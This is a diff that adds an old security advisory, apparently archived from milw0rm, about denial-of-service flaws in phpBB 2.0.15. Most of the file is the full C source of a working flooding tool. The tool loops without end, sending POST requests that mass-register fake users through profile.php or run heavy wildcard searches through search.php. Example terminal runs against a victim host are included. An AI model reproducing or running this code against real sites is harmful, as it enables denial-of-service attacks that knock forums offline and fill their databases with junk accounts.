@@ -1,0 +1,248 @@
+/*
+--------------------------------------------------------
+[N]eo [S]ecurity [T]eam [NST]® - Advisory #15 - 00/00/06
+--------------------------------------------------------
+Program:  phpBB 2.0.15
+Homepage:  http://www.phpbb.com
+Vulnerable Versions: phpBB 2.0.15 & Lower versions
+Risk: High Risk!!
+Impact: Multiple DoS Vulnerabilities.
+
+    -==phpBB 2.0.15 Multiple DoS Vulnerabilities ==-
+---------------------------------------------------------
+
+- Description
+---------------------------------------------------------
+phpBB is a high powered, fully scalable, and highly customizable
+Open Source bulletin board package. phpBB has a user-friendly
+interface, simple and straightforward administration panel, and
+helpful FAQ. Based on the powerful PHP server language and your
+choice of MySQL, MS-SQL, PostgreSQL or Access/ODBC database servers,
+phpBB is the ideal free community solution for all web sites.
+
+- Tested
+---------------------------------------------------------
+localhost & many forums
+
+- Explotation
+---------------------------------------------------------
+profile.php << By registering as many users as you can.
+search.php  << by searching in a way that the db couln't observe it.
+
+- Exploit
+---------------------------------------------------------
+[C Source]
+/*
+  Name: NsT-phpBBDoS
+  Copyright: NeoSecurityteam
+  Author: HaCkZaTaN
+  Date: 19/06/05
+  Description: xD You must figure out the problem xD
+  
+  root@NeoSecurity:/home/hackzatan# pico NsT-phpBBDoS.c
+  root@NeoSecurity:/home/hackzatan# gcc NsT-phpBBDoS.c -o NsT-phpBBDoS
+  root@NeoSecurity:/home/hackzatan# ./NsT-phpBBDoS
+  [+] NsT-phpBBDoS v0.1 by HaCkZaTaN
+  [+] NeoSecurityTeam
+  [+] Dos has begun....[+]
+  
+  [*] Use: ./NsT-phpBBDoS <path> <search.php or profile.php> <Host>
+  [*] Example: ./NsT-phpBBDoS /phpBB/ profile.php Victimshost.com
+  root@NeoSecurity:/home/hackzatan# ./NsT-phpBBDoS /phpBB/ profile.php Victimshost.com
+  [+] NsT-phpBBDoS v0.1 by HaCkZaTaN
+  [+] NeoSecurityTeam
+  [+] Dos has begun....[+]
+  
+  .................................
+  root@NeoSecurity:/home/hackzatan# echo "Let see how many users I have created"
+  root@NeoSecurity:/home/hackzatan# set | grep MACHTYPE
+  MACHTYPE=i486-slackware-linux-gnu
+  root@NeoSecurity:/home/hackzatan#
+
+*/
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <errno.h>
+#ifdef WIN32
+#include <winsock2.h>
+#pragma comment(lib, "ws2_32")
+#pragma pack(1)
+#define WIN32_LEAN_AND_MEAN
+#else
+#include <unistd.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
+#include <netdb.h>
+#endif
+
+#define __USE_GNU
+#define _XOPEN_SOURCE
+
+int Connection(char *, int);
+void Write_In(int , char *, char *a, char *, int);
+char Use(char *);
+
+int main(int argc, char *argv[])
+{
+    int sock, x = 0;
+    char *Path = argv[1], *Pro_Sea = argv[2], *Host = argv[3];
+
+    puts("[+] NsT-phpBBDoS v0.1 by HaCkZaTaN");
+    puts("[+] NeoSecurityTeam");
+    puts("[+] Dos has begun....[+]\n");
+    fflush(stdout);
+
+    if(argc != 4) Use(argv[0]);
+
+    while(1)
+    {
+           sock = Connection(Host,80);
+           Write_In(sock, Path, Pro_Sea, Host, x);
+           #ifndef WIN32
+           shutdown(sock, SHUT_WR);
+           close(sock);
+           #else
+           closesocket(sock);
+           WSACleanup();
+           #endif
+           Pro_Sea = argv[2];
+           x++;
+    }
+    //I don't think that it will get here =) 
+
+    return 0;
+}
+
+int Connection(char *Host, int Port)
+{
+        #ifndef WIN32
+        #define SOCKET int
+        #else
+        int error;
+        WSADATA wsadata;
+        error = WSAStartup(MAKEWORD(2, 2), &wsadata);
+
+        if (error == SOCKET_ERROR)
+        {
+                  perror("Could Not Start Up Winsock!\n");
+                  return;
+        }
+
+        #endif
+
+        SOCKET sockfd;
+        struct sockaddr_in sin;
+        struct in_addr  *myaddr;
+        struct hostent *h;
+        
+        if(Port <= 0 || Port > 65535)
+         {
+                  puts("[-] Invalid Port Number\n");
+                  fflush(stdout);
+                  exit(-1);
+         }
+        
+        if((sockfd =  socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) == -1)
+        {
+                    perror("socket() ");
+                    fflush (stdout);
+                    exit(-1);
+        }
+
+        if(isalpha(Host[0]))
+        {
+           if((h = gethostbyname(Host)) == NULL)
+           {
+                     perror("gethostbyname() ");
+                     fflush (stdout);
+                     exit(-1);
+           }
+        }
+        else
+        {
+              myaddr=(struct in_addr*)malloc(sizeof(struct in_addr));
+              myaddr->s_addr=inet_addr(Host);
+              
+              if((h = gethostbyaddr((char *) &myaddr, sizeof(myaddr), AF_INET)) != NULL)
+              {
+                     perror("gethostbyaddr() ");
+                     fflush (stdout);
+                     exit(-1);
+              }
+        }
+
+        memset(&sin, 0, sizeof(sin));
+        sin.sin_family = AF_INET;
+        sin.sin_port = htons(Port);
+        memcpy(&sin.sin_addr.s_addr, h->h_addr_list[0], h->h_length);
+
+        if(connect(sockfd, (struct sockaddr *)&sin, sizeof(struct sockaddr_in)) < 0)
+        {
+                     perror("connect() ");
+                     exit (-1);
+        }
+
+        return sockfd;
+}
+
+void Write_In(int sock, char *Path, char *Pro_Sea, char *Host, int x)
+{
+    char *str1 = (char *)malloc(4*BUFSIZ), *str2 = (char *)malloc(4*BUFSIZ);
+    char *req0 = "User-Agent: Mozilla/5.0 (BeOS; U; BeOS X.6; en-US; rv:1.7.8) Gecko/20050511 Firefox/1.0.4\r\n"
+                 "Accept: */*\r\n"
+                 "Accept-Language: en-us\r\n"
+                 "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\n"
+                 "Accept encoding: gzip,deflate\r\n"
+                 "Keep-Alive: 300\r\n"
+                 "Proxy-Connection: keep-alive\r\n"
+                 "Content-Type: application/x-www-form-urlencoded\r\n"
+                 "Cache-Control: no-cache\r\n"
+                 "Pragma: no-cache\r\n";
+    char *Profile = "%40neosecurityteam.net&new_password=0123456&password_confirm=0123456&icq=&aim=&msn=&yim=&website=&location=&occupation=&interests=&signature=&viewemail=0&hideonline=0&notifyreply=0&notifypm=1&popup_pm=1&attachsig=1&allowbbcode=1&allowhtml=0&allowsmilies=1&language=english&style=1&timezone=0&dateformat=D+M+d%2C+Y+g%3Ai+a&mode=register&agreed=true&coppa=0&submit=Submit\r\n";
+    char *Search  = "&search_terms=any&search_author=*&search_forum=-1&search_time=0&search_fields=all&search_cat=-1&sort_by=0&sort_dir=DESC&show_results=topics&return_chars=200\r\n";
+
+    if(strcmp("profile.php", Pro_Sea) == 0) sprintf(str1, "username=NsT__%d&email=NsT__%d%s", x, x, Profile);
+    else if(strcmp("search.php", Pro_Sea) == 0)
+    {
+               Pro_Sea = "search.php?mode=results";
+               sprintf(str1, "search_keywords=Hack%d%s", x, Search);
+    }
+    else
+    {
+               puts("Sorry. Try making the right choice");
+               exit(-1);
+    }
+
+    sprintf(str2, "POST %s%s HTTP/1.1\r\n"
+                  "Host: %s\r\n"
+                  "Referer: http://%s/\r\n%s"
+                  "Content-Length: %d\r\n\r\n%s", Path, Pro_Sea, Host, Host, req0, strlen(str1), str1);
+          
+    write(sock, str2, strlen(str2));
+    write(1, ".", 1);
+    fflush(stdout);
+}
+
+char Use(char *program)
+{
+	fprintf(stderr,"[*] Use: %s <path> <search.php or profile.php> <Host>\n", program);
+	fprintf(stderr,"[*] Example: %s /phpBB/ profile.php Victimshost.com\n", program);
+	fflush(stdout);
+	exit(-1);
+}
+
+/*
+
+@@@@'''@@@@'@@@@@@@@@'@@@@@@@@@@@
+'@@@@@''@@'@@@''''''''@@''@@@''@@
+'@@'@@@@@@''@@@@@@@@@'''''@@@
+'@@'''@@@@'''''''''@@@''''@@@
+@@@@''''@@'@@@@@@@@@@''''@@@@@
+
+*/
+
+// milw0rm.com [2005-06-22]
